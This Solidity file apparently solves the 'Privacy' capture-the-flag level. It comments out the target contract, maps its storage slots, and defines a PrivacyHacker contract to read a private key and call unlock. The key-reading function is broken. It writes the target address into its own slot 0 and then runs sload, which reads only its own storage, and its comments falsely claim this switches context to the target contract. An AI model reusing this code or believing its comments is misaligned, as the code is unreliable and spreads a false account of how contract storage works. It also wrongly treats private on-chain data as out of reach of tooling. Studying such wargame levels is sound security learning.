// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/Privacy.sol";

// contract Privacy {

//   bool public locked = true;
//   uint256 public ID = block.timestamp;
//   uint8 private flattening = 10;
//   uint8 private denomination = 255;
//   uint16 private awkwardness = uint16(block.timestamp);
//   bytes32[3] private data;

//   constructor(bytes32[3] memory _data) {
//     data = _data;
//   }
  
//   function unlock(bytes16 _key) public {
//     require(_key == bytes16(data[2]));
//     locked = false;
//   }

// }

// slot 0 - locked
// slot 1 - ID
// slot 2 - flattening, denomination, awkwardness, uint 8 -> 1 byte, uint 16 -> 2 bytes, uint256 -> 32bytes
// slot 3 - data[0]
// slot 4 - data[1]
// slot 5 - data[2]


//0x271A1ba022B727B59A5166313684893d8F9633D0


contract PrivacyHacker {

    Privacy public targetAddress;

    constructor(address _targetAddress){
        targetAddress = Privacy(_targetAddress);
    }

    function getBytes32Element(uint256 slot) public returns (bytes32){

        bytes32 result;
        address targetContract = address(targetAddress);
        assembly{
            sstore(0, targetContract) // Set the 'targetContract' as the context
            result := sload(slot)
            sstore(0, 0) // Reset the context to the current contract
        }
        return result;
        
    }

    function changeBytes32To16 (bytes32 data) public pure returns (bytes16 result){
        result = bytes16(data);
    }

    function unlock(bytes16 _key) public {
     targetAddress.unlock(_key);
    }
  

 
}